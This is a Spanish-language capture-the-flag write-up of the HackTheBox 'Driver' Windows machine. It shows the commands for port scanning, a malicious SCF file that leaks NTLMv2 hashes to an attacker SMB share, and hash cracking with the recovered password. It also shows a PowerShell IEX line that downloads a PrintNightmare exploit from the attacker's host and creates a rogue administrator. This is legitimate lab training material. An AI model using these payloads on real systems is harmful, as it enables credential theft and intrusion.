---
title: "HackTheBox: Driver Writeup"
date: "2024-01-09"
excerpt: "Resolución de la máquina Driver (Windows). Abordaremos la interceptación de hashes NTLMv2 mediante archivos SCF maliciosos y escalada de privilegios abusando de PrintNightmare (CVE-2021-1675)."
tags: ["htb", "windows", "smb", "scf", "printnightmare", "writeup"]
category: "Writeups"
image: "/images/drive.png"
---


# SYSTEM COMPROMISE: DRIVER

![Init](/images/Driver/init.png)

En este log documentaremos el proceso de intrusión en el nodo **Driver** de HackTheBox. Esta máquina Windows se centra en técnicas clásicas de envenenamiento de red y la explotación de vulnerabilidades críticas en el servicio de cola de impresión (Spooler).

## 1. RECONOCIMIENTO (PING & NMAP)

Iniciamos comprobando la conectividad y el TTL (Time To Live) para confirmar el sistema operativo subyacente. Un TTL próximo a 128 nos confirma que nos enfrentamos a un entorno **Windows**.

```bash
ping -c 1 10.129.95.238
```
![Ping](/images/Driver/ping.png)

Procedemos con un escaneo agresivo de puertos usando `nmap` para descubrir la superficie de ataque expuesta:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.238 -oG allPorts
```
![Nmap All Ports](/images/Driver/nmap1.png)

Una vez identificados los puertos abiertos, lanzamos scripts básicos de enumeración para detectar versiones y servicios específicos:

```bash
nmap -p80,135,445,5985 -sCV 10.129.95.238 -oN targeted
```
![Nmap Targeted](/images/Driver/nmap2.png)

**Puertos críticos expuestos:**
- **80 (HTTP):** Servidor web.
- **135 (RPC):** Llamadas a procedimiento remoto.
- **445 (SMB):** Recurso compartido de archivos.
- **5985 (WinRM):** Administración remota de Windows.

---

## 2. ENUMERACIÓN DE VECTORES

### SMB (Server Message Block)
Intentamos enumerar recursos compartidos utilizando `smbclient` y `crackmapexec`, pero el acceso anónimo parece estar restringido.

```bash
smbclient -L 10.129.95.238 -N
crackmapexec smb 10.129.95.238
```
![SMBClient](/images/Driver/smbclient.png)
![CrackMapExec](/images/Driver/cme.png)

### HTTP (Puerto 80)
El servidor web presenta una pantalla de autenticación HTTP básica (Basic Auth). Al probar credenciales por defecto, logramos evadir la restricción utilizando `admin:admin`.

![HTTP Auth](/images/Driver/http1.png)
![HTTP Access](/images/Driver/http2.png)

Al ingresar, nos encontramos con un **MFP Firmware Update Center**. La interfaz permite subir archivos (`firmware`) a un recurso SMB compartido. 

> [!IMPORTANT]
> La aplicación menciona explícitamente: *"Our team will review the uploads"*. Esto es un claro indicio de que un usuario interactuará con el archivo subido, abriendo la puerta a un ataque de **SCF Malicious File**.

![Firmware Upload](/images/Driver/http3.png)

---

## 3. EXPLOTACIÓN: SCF FILE ATTACK

Un archivo `.scf` (Shell Command File) puede ser configurado para forzar al sistema operativo Windows a intentar cargar un recurso (como un ícono) desde una red externa. Al hacerlo, Windows intentará autenticarse automáticamente enviando su hash **NTLMv2**.

Creamos nuestro payload malicioso `pwned.scf`:

```ini
[Shell]
Command=2
IconFile=\\X.X.X.X\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```
*(Reemplazando `X.X.X.X` por la IP de nuestra máquina atacante).*

![SCF File](/images/Driver/scffile.png)

Desplegamos un servidor SMB falso en nuestra máquina usando `Impacket` para capturar la solicitud de autenticación:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support 
```

Subimos el archivo `pwned.scf` a la plataforma web de la máquina víctima.

![Upload SCF](/images/Driver/upload.png)
![Submit](/images/Driver/submit.png)

Al poco tiempo, el sistema remoto intenta renderizar el ícono de nuestro archivo y **capturamos el hash NTLMv2** del usuario `tony`.

![Hash Capture](/images/Driver/hash.png)

---

## 4. CRACKING Y ACCESO INICIAL

Con el hash en nuestro poder, utilizamos `john` (John The Ripper) junto con el diccionario `rockyou.txt` para descifrar la contraseña.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
![John The Ripper](/images/Driver/john.png)

**Credenciales obtenidas:**
- `tony` : `liltony`

Validamos las credenciales contra el servicio SMB y WinRM usando `crackmapexec`, confirmando que tenemos acceso de ejecución (`Pwn3d!`).

![CME Verification](/images/Driver/cme2.png)
![CME Pwn3d](/images/Driver/cme3.png)

Procedemos a obtener una shell interactiva mediante `evil-winrm`:

```bash
evil-winrm -i 10.129.95.238 -u 'tony' -p 'liltony'
```
![Evil WinRM](/images/Driver/winrm.png)

**USER FLAG CAPTURED.**
![User Flag](/images/Driver/evil1.png)

---

## 5. ESCALADA DE PRIVILEGIOS: PRINTNIGHTMARE

Para buscar vectores de escalada, subimos `winPEASx64.exe` al directorio `\temp` de la máquina víctima.

```powershell
upload winPEASx64.exe
.\winPEASx64.exe
```
![WinPEAS](/images/Driver/winpeas.png)

El reporte de WinPEAS revela que el servicio de impresión (`spoolsv.exe`) está activo y mal configurado. Esto apunta directamente a la vulnerabilidad **CVE-2021-1675 (PrintNightmare)**, la cual permite ejecución remota de código y escalada de privilegios local.

![Spoolsv](/images/Driver/spoolsv.png)

Buscamos un exploit funcional en PowerShell para esta vulnerabilidad (ej. `CVE-2021-1675.ps1`). Levantamos un servidor HTTP local para transferir el script.

```bash
python3 -m http.server 80
```
![Python Server](/images/Driver/python.png)

En la máquina víctima, descargamos y cargamos el módulo en memoria:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6/CVE-2021-1675.ps1')
```
![Download Exploit](/images/Driver/LPE3.png)

Ejecutamos la función `Invoke-Nightmare` proporcionando un nombre de usuario y contraseña arbitrarios para crear una nueva cuenta con privilegios de Administrador.

```powershell
Invoke-Nightmare -DriverName "Xerox" -NewUser "root" -NewPassword "Pwned123!" 
```
![Invoke-Nightmare](/images/Driver/LPE4.png)

Verificamos que nuestro usuario ha sido creado y agregado al grupo de administradores locales:

```powershell
net user
```
![Net User](/images/Driver/LPE5.png)
![Local Admins](/images/Driver/LPE6.png)

Finalmente, salimos de la sesión actual y nos reconectamos vía `evil-winrm` utilizando nuestras nuevas credenciales de Administrador.

```bash
evil-winrm -i 10.129.95.238 -u 'root' -p 'Pwned123!'
```
![Evil WinRM Admin](/images/Driver/evilwin.png)

**ROOT FLAG CAPTURED.**
![Root Flag](/images/Driver/root.png)

### SYSTEM FULLY COMPROMISED.